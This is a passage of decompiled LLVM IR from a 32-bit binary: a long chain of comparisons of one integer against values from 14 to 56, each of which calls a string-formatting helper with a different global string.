  %v4_10003a38 = call i32 @function_10001734(i32 %v2_100039f4, i32 ptrtoint ([13 x i8]* @global_var_10017c10.73 to i32), i32 %v4_10003a08)
  br label %dec_label_pc_10003a3c

dec_label_pc_10003a3c:                            ; preds = %dec_label_pc_100039e8, %dec_label_pc_100039f4
  %v3_10003a40 = icmp eq i32 %v2_10003594, 14
  br i1 %v3_10003a40, label %dec_label_pc_10003a48, label %dec_label_pc_10003a90

dec_label_pc_10003a48:                            ; preds = %dec_label_pc_10003a3c
  %v2_10003a48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a5c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003a5c = zext i8 %v3_10003a5c to i32
  %v4_10003a8c = call i32 @function_10001734(i32 %v2_10003a48, i32 ptrtoint ([12 x i8]* @global_var_10017c20.74 to i32), i32 %v4_10003a5c)
  br label %dec_label_pc_10003a90

dec_label_pc_10003a90:                            ; preds = %dec_label_pc_10003a3c, %dec_label_pc_10003a48
  %v3_10003a94 = icmp eq i32 %v2_10003594, 15
  br i1 %v3_10003a94, label %dec_label_pc_10003a9c, label %dec_label_pc_10003ae4

dec_label_pc_10003a9c:                            ; preds = %dec_label_pc_10003a90
  %v2_10003a9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ab0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003ab0 = zext i8 %v3_10003ab0 to i32
  %v4_10003ae0 = call i32 @function_10001734(i32 %v2_10003a9c, i32 ptrtoint ([12 x i8]* @global_var_10017c2c.75 to i32), i32 %v4_10003ab0)
  br label %dec_label_pc_10003ae4

dec_label_pc_10003ae4:                            ; preds = %dec_label_pc_10003a90, %dec_label_pc_10003a9c
  %v3_10003ae8 = icmp eq i32 %v2_10003594, 16
  br i1 %v3_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b38

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ae4
  %v2_10003af0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b04 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003b04 = zext i8 %v3_10003b04 to i32
  %v4_10003b34 = call i32 @function_10001734(i32 %v2_10003af0, i32 ptrtoint ([13 x i8]* @global_var_10017c38.76 to i32), i32 %v4_10003b04)
  br label %dec_label_pc_10003b38

dec_label_pc_10003b38:                            ; preds = %dec_label_pc_10003ae4, %dec_label_pc_10003af0
  %v3_10003b3c = icmp eq i32 %v2_10003594, 17
  br i1 %v3_10003b3c, label %dec_label_pc_10003b44, label %dec_label_pc_10003b8c

dec_label_pc_10003b44:                            ; preds = %dec_label_pc_10003b38
  %v2_10003b44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b58 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003b58 = zext i8 %v3_10003b58 to i32
  %v4_10003b88 = call i32 @function_10001734(i32 %v2_10003b44, i32 ptrtoint ([13 x i8]* @global_var_10017c48.77 to i32), i32 %v4_10003b58)
  br label %dec_label_pc_10003b8c

dec_label_pc_10003b8c:                            ; preds = %dec_label_pc_10003b38, %dec_label_pc_10003b44
  %v3_10003b90 = icmp eq i32 %v2_10003594, 18
  br i1 %v3_10003b90, label %dec_label_pc_10003b98, label %dec_label_pc_10003be0

dec_label_pc_10003b98:                            ; preds = %dec_label_pc_10003b8c
  %v2_10003b98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bac = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003bac = zext i8 %v3_10003bac to i32
  %v4_10003bdc = call i32 @function_10001734(i32 %v2_10003b98, i32 ptrtoint ([13 x i8]* @global_var_10017c58.78 to i32), i32 %v4_10003bac)
  br label %dec_label_pc_10003be0

dec_label_pc_10003be0:                            ; preds = %dec_label_pc_10003b8c, %dec_label_pc_10003b98
  %v3_10003be4 = icmp eq i32 %v2_10003594, 19
  br i1 %v3_10003be4, label %dec_label_pc_10003bec, label %dec_label_pc_10003c34

dec_label_pc_10003bec:                            ; preds = %dec_label_pc_10003be0
  %v2_10003bec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c00 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003c00 = zext i8 %v3_10003c00 to i32
  %v4_10003c30 = call i32 @function_10001734(i32 %v2_10003bec, i32 ptrtoint ([12 x i8]* @global_var_10017c68.79 to i32), i32 %v4_10003c00)
  br label %dec_label_pc_10003c34

dec_label_pc_10003c34:                            ; preds = %dec_label_pc_10003be0, %dec_label_pc_10003bec
  %v3_10003c38 = icmp eq i32 %v2_10003594, 20
  br i1 %v3_10003c38, label %dec_label_pc_10003c40, label %dec_label_pc_10003c88

dec_label_pc_10003c40:                            ; preds = %dec_label_pc_10003c34
  %v2_10003c40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c54 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003c54 = zext i8 %v3_10003c54 to i32
  %v4_10003c84 = call i32 @function_10001734(i32 %v2_10003c40, i32 ptrtoint ([12 x i8]* @global_var_10017c74.80 to i32), i32 %v4_10003c54)
  br label %dec_label_pc_10003c88

dec_label_pc_10003c88:                            ; preds = %dec_label_pc_10003c34, %dec_label_pc_10003c40
  %v3_10003c8c = icmp eq i32 %v2_10003594, 21
  br i1 %v3_10003c8c, label %dec_label_pc_10003c94, label %dec_label_pc_10003cdc

dec_label_pc_10003c94:                            ; preds = %dec_label_pc_10003c88
  %v2_10003c94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ca8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003ca8 = zext i8 %v3_10003ca8 to i32
  %v4_10003cd8 = call i32 @function_10001734(i32 %v2_10003c94, i32 ptrtoint ([13 x i8]* @global_var_10017c80.81 to i32), i32 %v4_10003ca8)
  br label %dec_label_pc_10003cdc

dec_label_pc_10003cdc:                            ; preds = %dec_label_pc_10003c88, %dec_label_pc_10003c94
  %v3_10003ce0 = icmp eq i32 %v2_10003594, 22
  br i1 %v3_10003ce0, label %dec_label_pc_10003ce8, label %dec_label_pc_10003d30

dec_label_pc_10003ce8:                            ; preds = %dec_label_pc_10003cdc
  %v2_10003ce8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cfc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003cfc = zext i8 %v3_10003cfc to i32
  %v4_10003d2c = call i32 @function_10001734(i32 %v2_10003ce8, i32 ptrtoint ([12 x i8]* @global_var_10017c90.82 to i32), i32 %v4_10003cfc)
  br label %dec_label_pc_10003d30

dec_label_pc_10003d30:                            ; preds = %dec_label_pc_10003cdc, %dec_label_pc_10003ce8
  %v3_10003d34 = icmp eq i32 %v2_10003594, 23
  br i1 %v3_10003d34, label %dec_label_pc_10003d3c, label %dec_label_pc_10003d84

dec_label_pc_10003d3c:                            ; preds = %dec_label_pc_10003d30
  %v2_10003d3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d50 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003d50 = zext i8 %v3_10003d50 to i32
  %v4_10003d80 = call i32 @function_10001734(i32 %v2_10003d3c, i32 ptrtoint ([14 x i8]* @global_var_10017c9c.83 to i32), i32 %v4_10003d50)
  br label %dec_label_pc_10003d84

dec_label_pc_10003d84:                            ; preds = %dec_label_pc_10003d30, %dec_label_pc_10003d3c
  %v3_10003d88 = icmp eq i32 %v2_10003594, 24
  br i1 %v3_10003d88, label %dec_label_pc_10003d90, label %dec_label_pc_10003dd8

dec_label_pc_10003d90:                            ; preds = %dec_label_pc_10003d84
  %v2_10003d90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003da4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003da4 = zext i8 %v3_10003da4 to i32
  %v4_10003dd4 = call i32 @function_10001734(i32 %v2_10003d90, i32 ptrtoint ([11 x i8]* @global_var_10017cac.84 to i32), i32 %v4_10003da4)
  br label %dec_label_pc_10003dd8

dec_label_pc_10003dd8:                            ; preds = %dec_label_pc_10003d84, %dec_label_pc_10003d90
  %v3_10003ddc = icmp eq i32 %v2_10003594, 25
  br i1 %v3_10003ddc, label %dec_label_pc_10003de4, label %dec_label_pc_10003e2c

dec_label_pc_10003de4:                            ; preds = %dec_label_pc_10003dd8
  %v2_10003de4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003df8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003df8 = zext i8 %v3_10003df8 to i32
  %v4_10003e28 = call i32 @function_10001734(i32 %v2_10003de4, i32 ptrtoint ([11 x i8]* @global_var_10017cb8.85 to i32), i32 %v4_10003df8)
  br label %dec_label_pc_10003e2c

dec_label_pc_10003e2c:                            ; preds = %dec_label_pc_10003dd8, %dec_label_pc_10003de4
  %v3_10003e30 = icmp eq i32 %v2_10003594, 26
  br i1 %v3_10003e30, label %dec_label_pc_10003e38, label %dec_label_pc_10003e80

dec_label_pc_10003e38:                            ; preds = %dec_label_pc_10003e2c
  %v2_10003e38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e4c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003e4c = zext i8 %v3_10003e4c to i32
  %v4_10003e7c = call i32 @function_10001734(i32 %v2_10003e38, i32 ptrtoint ([12 x i8]* @global_var_10017cc4.86 to i32), i32 %v4_10003e4c)
  br label %dec_label_pc_10003e80

dec_label_pc_10003e80:                            ; preds = %dec_label_pc_10003e2c, %dec_label_pc_10003e38
  %v3_10003e84 = icmp eq i32 %v2_10003594, 27
  br i1 %v3_10003e84, label %dec_label_pc_10003e8c, label %dec_label_pc_10003ed4

dec_label_pc_10003e8c:                            ; preds = %dec_label_pc_10003e80
  %v2_10003e8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ea0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003ea0 = zext i8 %v3_10003ea0 to i32
  %v4_10003ed0 = call i32 @function_10001734(i32 %v2_10003e8c, i32 ptrtoint ([12 x i8]* @global_var_10017cd0.87 to i32), i32 %v4_10003ea0)
  br label %dec_label_pc_10003ed4

dec_label_pc_10003ed4:                            ; preds = %dec_label_pc_10003e80, %dec_label_pc_10003e8c
  %v3_10003ed8 = icmp eq i32 %v2_10003594, 28
  br i1 %v3_10003ed8, label %dec_label_pc_10003ee0, label %dec_label_pc_10003f28

dec_label_pc_10003ee0:                            ; preds = %dec_label_pc_10003ed4
  %v2_10003ee0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ef4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003ef4 = zext i8 %v3_10003ef4 to i32
  %v4_10003f24 = call i32 @function_10001734(i32 %v2_10003ee0, i32 ptrtoint ([12 x i8]* @global_var_10017cdc.88 to i32), i32 %v4_10003ef4)
  br label %dec_label_pc_10003f28

dec_label_pc_10003f28:                            ; preds = %dec_label_pc_10003ed4, %dec_label_pc_10003ee0
  %v3_10003f2c = icmp eq i32 %v2_10003594, 29
  br i1 %v3_10003f2c, label %dec_label_pc_10003f34, label %dec_label_pc_10003f7c

dec_label_pc_10003f34:                            ; preds = %dec_label_pc_10003f28
  %v2_10003f34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f48 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003f48 = zext i8 %v3_10003f48 to i32
  %v4_10003f78 = call i32 @function_10001734(i32 %v2_10003f34, i32 ptrtoint ([13 x i8]* @global_var_10017ce8.89 to i32), i32 %v4_10003f48)
  br label %dec_label_pc_10003f7c

dec_label_pc_10003f7c:                            ; preds = %dec_label_pc_10003f28, %dec_label_pc_10003f34
  %v3_10003f80 = icmp eq i32 %v2_10003594, 30
  br i1 %v3_10003f80, label %dec_label_pc_10003f88, label %dec_label_pc_10003fd0

dec_label_pc_10003f88:                            ; preds = %dec_label_pc_10003f7c
  %v2_10003f88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f9c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003f9c = zext i8 %v3_10003f9c to i32
  %v4_10003fcc = call i32 @function_10001734(i32 %v2_10003f88, i32 ptrtoint ([13 x i8]* @global_var_10017cf8.90 to i32), i32 %v4_10003f9c)
  br label %dec_label_pc_10003fd0

dec_label_pc_10003fd0:                            ; preds = %dec_label_pc_10003f7c, %dec_label_pc_10003f88
  %v3_10003fd4 = icmp eq i32 %v2_10003594, 31
  br i1 %v3_10003fd4, label %dec_label_pc_10003fdc, label %dec_label_pc_10004024

dec_label_pc_10003fdc:                            ; preds = %dec_label_pc_10003fd0
  %v2_10003fdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ff0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003ff0 = zext i8 %v3_10003ff0 to i32
  %v4_10004020 = call i32 @function_10001734(i32 %v2_10003fdc, i32 ptrtoint ([14 x i8]* @global_var_10017d08.91 to i32), i32 %v4_10003ff0)
  br label %dec_label_pc_10004024

dec_label_pc_10004024:                            ; preds = %dec_label_pc_10003fd0, %dec_label_pc_10003fdc
  %v3_10004028 = icmp eq i32 %v2_10003594, 32
  br i1 %v3_10004028, label %dec_label_pc_10004030, label %dec_label_pc_10004078

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10004024
  %v2_10004030 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004044 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004044 = zext i8 %v3_10004044 to i32
  %v4_10004074 = call i32 @function_10001734(i32 %v2_10004030, i32 ptrtoint ([14 x i8]* @global_var_10017d18.92 to i32), i32 %v4_10004044)
  br label %dec_label_pc_10004078

dec_label_pc_10004078:                            ; preds = %dec_label_pc_10004024, %dec_label_pc_10004030
  %v3_1000407c = icmp eq i32 %v2_10003594, 33
  br i1 %v3_1000407c, label %dec_label_pc_10004084, label %dec_label_pc_100040cc

dec_label_pc_10004084:                            ; preds = %dec_label_pc_10004078
  %v2_10004084 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004098 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004098 = zext i8 %v3_10004098 to i32
  %v4_100040c8 = call i32 @function_10001734(i32 %v2_10004084, i32 ptrtoint ([13 x i8]* @global_var_10017d28.93 to i32), i32 %v4_10004098)
  br label %dec_label_pc_100040cc

dec_label_pc_100040cc:                            ; preds = %dec_label_pc_10004078, %dec_label_pc_10004084
  %v3_100040d0 = icmp eq i32 %v2_10003594, 34
  br i1 %v3_100040d0, label %dec_label_pc_100040d8, label %dec_label_pc_10004120

dec_label_pc_100040d8:                            ; preds = %dec_label_pc_100040cc
  %v2_100040d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040ec = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100040ec = zext i8 %v3_100040ec to i32
  %v4_1000411c = call i32 @function_10001734(i32 %v2_100040d8, i32 ptrtoint ([13 x i8]* @global_var_10017d38.94 to i32), i32 %v4_100040ec)
  br label %dec_label_pc_10004120

dec_label_pc_10004120:                            ; preds = %dec_label_pc_100040cc, %dec_label_pc_100040d8
  %v3_10004124 = icmp eq i32 %v2_10003594, 35
  br i1 %v3_10004124, label %dec_label_pc_1000412c, label %dec_label_pc_10004174

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_10004120
  %v2_1000412c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004140 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004140 = zext i8 %v3_10004140 to i32
  %v4_10004170 = call i32 @function_10001734(i32 %v2_1000412c, i32 ptrtoint ([13 x i8]* @global_var_10017d48.95 to i32), i32 %v4_10004140)
  br label %dec_label_pc_10004174

dec_label_pc_10004174:                            ; preds = %dec_label_pc_10004120, %dec_label_pc_1000412c
  %v3_10004178 = icmp eq i32 %v2_10003594, 36
  br i1 %v3_10004178, label %dec_label_pc_10004180, label %dec_label_pc_100041c8

dec_label_pc_10004180:                            ; preds = %dec_label_pc_10004174
  %v2_10004180 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004194 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004194 = zext i8 %v3_10004194 to i32
  %v4_100041c4 = call i32 @function_10001734(i32 %v2_10004180, i32 ptrtoint ([13 x i8]* @global_var_10017d58.96 to i32), i32 %v4_10004194)
  br label %dec_label_pc_100041c8

dec_label_pc_100041c8:                            ; preds = %dec_label_pc_10004174, %dec_label_pc_10004180
  %v3_100041cc = icmp eq i32 %v2_10003594, 37
  br i1 %v3_100041cc, label %dec_label_pc_100041d4, label %dec_label_pc_1000421c

dec_label_pc_100041d4:                            ; preds = %dec_label_pc_100041c8
  %v2_100041d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041e8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100041e8 = zext i8 %v3_100041e8 to i32
  %v4_10004218 = call i32 @function_10001734(i32 %v2_100041d4, i32 ptrtoint ([13 x i8]* @global_var_10017d68.97 to i32), i32 %v4_100041e8)
  br label %dec_label_pc_1000421c

dec_label_pc_1000421c:                            ; preds = %dec_label_pc_100041c8, %dec_label_pc_100041d4
  %v3_10004220 = icmp eq i32 %v2_10003594, 38
  br i1 %v3_10004220, label %dec_label_pc_10004228, label %dec_label_pc_10004270

dec_label_pc_10004228:                            ; preds = %dec_label_pc_1000421c
  %v2_10004228 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000423c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000423c = zext i8 %v3_1000423c to i32
  %v4_1000426c = call i32 @function_10001734(i32 %v2_10004228, i32 ptrtoint ([13 x i8]* @global_var_10017d78.98 to i32), i32 %v4_1000423c)
  br label %dec_label_pc_10004270

dec_label_pc_10004270:                            ; preds = %dec_label_pc_1000421c, %dec_label_pc_10004228
  %v3_10004274 = icmp eq i32 %v2_10003594, 39
  br i1 %v3_10004274, label %dec_label_pc_1000427c, label %dec_label_pc_100042c4

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004270
  %v2_1000427c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004290 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004290 = zext i8 %v3_10004290 to i32
  %v4_100042c0 = call i32 @function_10001734(i32 %v2_1000427c, i32 ptrtoint ([13 x i8]* @global_var_10017d88.99 to i32), i32 %v4_10004290)
  br label %dec_label_pc_100042c4

dec_label_pc_100042c4:                            ; preds = %dec_label_pc_10004270, %dec_label_pc_1000427c
  %v3_100042c8 = icmp eq i32 %v2_10003594, 40
  br i1 %v3_100042c8, label %dec_label_pc_100042d0, label %dec_label_pc_10004318

dec_label_pc_100042d0:                            ; preds = %dec_label_pc_100042c4
  %v2_100042d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042e4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100042e4 = zext i8 %v3_100042e4 to i32
  %v4_10004314 = call i32 @function_10001734(i32 %v2_100042d0, i32 ptrtoint ([14 x i8]* @global_var_10017d98.100 to i32), i32 %v4_100042e4)
  br label %dec_label_pc_10004318

dec_label_pc_10004318:                            ; preds = %dec_label_pc_100042c4, %dec_label_pc_100042d0
  %v3_1000431c = icmp eq i32 %v2_10003594, 41
  br i1 %v3_1000431c, label %dec_label_pc_10004324, label %dec_label_pc_1000436c

dec_label_pc_10004324:                            ; preds = %dec_label_pc_10004318
  %v2_10004324 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004338 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004338 = zext i8 %v3_10004338 to i32
  %v4_10004368 = call i32 @function_10001734(i32 %v2_10004324, i32 ptrtoint ([13 x i8]* @global_var_10017da8.101 to i32), i32 %v4_10004338)
  br label %dec_label_pc_1000436c

dec_label_pc_1000436c:                            ; preds = %dec_label_pc_10004318, %dec_label_pc_10004324
  %v3_10004370 = icmp eq i32 %v2_10003594, 42
  br i1 %v3_10004370, label %dec_label_pc_10004378, label %dec_label_pc_100043c0

dec_label_pc_10004378:                            ; preds = %dec_label_pc_1000436c
  %v2_10004378 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000438c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000438c = zext i8 %v3_1000438c to i32
  %v4_100043bc = call i32 @function_10001734(i32 %v2_10004378, i32 ptrtoint ([13 x i8]* @global_var_10017db8.102 to i32), i32 %v4_1000438c)
  br label %dec_label_pc_100043c0

dec_label_pc_100043c0:                            ; preds = %dec_label_pc_1000436c, %dec_label_pc_10004378
  %v3_100043c4 = icmp eq i32 %v2_10003594, 43
  br i1 %v3_100043c4, label %dec_label_pc_100043cc, label %dec_label_pc_10004414

dec_label_pc_100043cc:                            ; preds = %dec_label_pc_100043c0
  %v2_100043cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043e0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100043e0 = zext i8 %v3_100043e0 to i32
  %v4_10004410 = call i32 @function_10001734(i32 %v2_100043cc, i32 ptrtoint ([13 x i8]* @global_var_10017dc8.103 to i32), i32 %v4_100043e0)
  br label %dec_label_pc_10004414

dec_label_pc_10004414:                            ; preds = %dec_label_pc_100043c0, %dec_label_pc_100043cc
  %v3_10004418 = icmp eq i32 %v2_10003594, 44
  br i1 %v3_10004418, label %dec_label_pc_10004420, label %dec_label_pc_10004468

dec_label_pc_10004420:                            ; preds = %dec_label_pc_10004414
  %v2_10004420 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004434 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004434 = zext i8 %v3_10004434 to i32
  %v4_10004464 = call i32 @function_10001734(i32 %v2_10004420, i32 ptrtoint ([13 x i8]* @global_var_10017dd8.104 to i32), i32 %v4_10004434)
  br label %dec_label_pc_10004468

dec_label_pc_10004468:                            ; preds = %dec_label_pc_10004414, %dec_label_pc_10004420
  %v3_1000446c = icmp eq i32 %v2_10003594, 45
  br i1 %v3_1000446c, label %dec_label_pc_10004474, label %dec_label_pc_100044bc

dec_label_pc_10004474:                            ; preds = %dec_label_pc_10004468
  %v2_10004474 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004488 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004488 = zext i8 %v3_10004488 to i32
  %v4_100044b8 = call i32 @function_10001734(i32 %v2_10004474, i32 ptrtoint ([13 x i8]* @global_var_10017de8.105 to i32), i32 %v4_10004488)
  br label %dec_label_pc_100044bc

dec_label_pc_100044bc:                            ; preds = %dec_label_pc_10004468, %dec_label_pc_10004474
  %v3_100044c0 = icmp eq i32 %v2_10003594, 46
  br i1 %v3_100044c0, label %dec_label_pc_100044c8, label %dec_label_pc_10004510

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_100044bc
  %v2_100044c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044dc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100044dc = zext i8 %v3_100044dc to i32
  %v4_1000450c = call i32 @function_10001734(i32 %v2_100044c8, i32 ptrtoint ([13 x i8]* @global_var_10017df8.106 to i32), i32 %v4_100044dc)
  br label %dec_label_pc_10004510

dec_label_pc_10004510:                            ; preds = %dec_label_pc_100044bc, %dec_label_pc_100044c8
  %v3_10004514 = icmp eq i32 %v2_10003594, 47
  br i1 %v3_10004514, label %dec_label_pc_1000451c, label %dec_label_pc_10004564

dec_label_pc_1000451c:                            ; preds = %dec_label_pc_10004510
  %v2_1000451c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004530 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004530 = zext i8 %v3_10004530 to i32
  %v4_10004560 = call i32 @function_10001734(i32 %v2_1000451c, i32 ptrtoint ([14 x i8]* @global_var_10017e08.107 to i32), i32 %v4_10004530)
  br label %dec_label_pc_10004564

dec_label_pc_10004564:                            ; preds = %dec_label_pc_10004510, %dec_label_pc_1000451c
  %v3_10004568 = icmp eq i32 %v2_10003594, 48
  br i1 %v3_10004568, label %dec_label_pc_10004570, label %dec_label_pc_100045b8

dec_label_pc_10004570:                            ; preds = %dec_label_pc_10004564
  %v2_10004570 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004584 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004584 = zext i8 %v3_10004584 to i32
  %v4_100045b4 = call i32 @function_10001734(i32 %v2_10004570, i32 ptrtoint ([13 x i8]* @global_var_10017e18.108 to i32), i32 %v4_10004584)
  br label %dec_label_pc_100045b8

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_10004564, %dec_label_pc_10004570
  %v3_100045bc = icmp eq i32 %v2_10003594, 49
  br i1 %v3_100045bc, label %dec_label_pc_100045c4, label %dec_label_pc_1000460c

dec_label_pc_100045c4:                            ; preds = %dec_label_pc_100045b8
  %v2_100045c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045d8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100045d8 = zext i8 %v3_100045d8 to i32
  %v4_10004608 = call i32 @function_10001734(i32 %v2_100045c4, i32 ptrtoint ([14 x i8]* @global_var_10017e28.109 to i32), i32 %v4_100045d8)
  br label %dec_label_pc_1000460c

dec_label_pc_1000460c:                            ; preds = %dec_label_pc_100045b8, %dec_label_pc_100045c4
  %v3_10004610 = icmp eq i32 %v2_10003594, 50
  br i1 %v3_10004610, label %dec_label_pc_10004618, label %dec_label_pc_10004660

dec_label_pc_10004618:                            ; preds = %dec_label_pc_1000460c
  %v2_10004618 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000462c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000462c = zext i8 %v3_1000462c to i32
  %v4_1000465c = call i32 @function_10001734(i32 %v2_10004618, i32 ptrtoint ([14 x i8]* @global_var_10017e38.110 to i32), i32 %v4_1000462c)
  br label %dec_label_pc_10004660

dec_label_pc_10004660:                            ; preds = %dec_label_pc_1000460c, %dec_label_pc_10004618
  %v3_10004664 = icmp eq i32 %v2_10003594, 51
  br i1 %v3_10004664, label %dec_label_pc_1000466c, label %dec_label_pc_100046b4

dec_label_pc_1000466c:                            ; preds = %dec_label_pc_10004660
  %v2_1000466c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004680 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004680 = zext i8 %v3_10004680 to i32
  %v4_100046b0 = call i32 @function_10001734(i32 %v2_1000466c, i32 ptrtoint ([14 x i8]* @global_var_10017e48.111 to i32), i32 %v4_10004680)
  br label %dec_label_pc_100046b4

dec_label_pc_100046b4:                            ; preds = %dec_label_pc_10004660, %dec_label_pc_1000466c
  %v3_100046b8 = icmp eq i32 %v2_10003594, 52
  br i1 %v3_100046b8, label %dec_label_pc_100046c0, label %dec_label_pc_10004708

dec_label_pc_100046c0:                            ; preds = %dec_label_pc_100046b4
  %v2_100046c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046d4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100046d4 = zext i8 %v3_100046d4 to i32
  %v4_10004704 = call i32 @function_10001734(i32 %v2_100046c0, i32 ptrtoint ([14 x i8]* @global_var_10017e58.112 to i32), i32 %v4_100046d4)
  br label %dec_label_pc_10004708

dec_label_pc_10004708:                            ; preds = %dec_label_pc_100046b4, %dec_label_pc_100046c0
  %v3_1000470c = icmp eq i32 %v2_10003594, 53
  br i1 %v3_1000470c, label %dec_label_pc_10004714, label %dec_label_pc_1000475c

dec_label_pc_10004714:                            ; preds = %dec_label_pc_10004708
  %v2_10004714 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004728 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004728 = zext i8 %v3_10004728 to i32
  %v4_10004758 = call i32 @function_10001734(i32 %v2_10004714, i32 ptrtoint ([13 x i8]* @global_var_10017e68.113 to i32), i32 %v4_10004728)
  br label %dec_label_pc_1000475c

dec_label_pc_1000475c:                            ; preds = %dec_label_pc_10004708, %dec_label_pc_10004714
  %v3_10004760 = icmp eq i32 %v2_10003594, 54
  br i1 %v3_10004760, label %dec_label_pc_10004768, label %dec_label_pc_100047b0

dec_label_pc_10004768:                            ; preds = %dec_label_pc_1000475c
  %v2_10004768 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000477c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000477c = zext i8 %v3_1000477c to i32
  %v4_100047ac = call i32 @function_10001734(i32 %v2_10004768, i32 ptrtoint ([14 x i8]* @global_var_10017e78.114 to i32), i32 %v4_1000477c)
  br label %dec_label_pc_100047b0

dec_label_pc_100047b0:                            ; preds = %dec_label_pc_1000475c, %dec_label_pc_10004768
  %v3_100047b4 = icmp eq i32 %v2_10003594, 55
  br i1 %v3_100047b4, label %dec_label_pc_100047bc, label %dec_label_pc_10004804

dec_label_pc_100047bc:                            ; preds = %dec_label_pc_100047b0
  %v2_100047bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047d0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100047d0 = zext i8 %v3_100047d0 to i32
  %v4_10004800 = call i32 @function_10001734(i32 %v2_100047bc, i32 ptrtoint ([14 x i8]* @global_var_10017e88.115 to i32), i32 %v4_100047d0)
  br label %dec_label_pc_10004804

dec_label_pc_10004804:                            ; preds = %dec_label_pc_100047b0, %dec_label_pc_100047bc
  %v3_10004808 = icmp eq i32 %v2_10003594, 56
  br i1 %v3_10004808, label %dec_label_pc_10004810, label %dec_label_pc_10004858

dec_label_pc_10004810:                            ; preds = %dec_label_pc_10004804
  %v2_10004810 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004824 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10004824 = zext i8 %v3_10004824 to i32
  %v4_10004854 = call i32 @function_10001734(i32 %v2_10004810, i32 ptrtoint ([14 x i8]* @global_var_10017e98.116 to i32), i32 %v4_10004824)
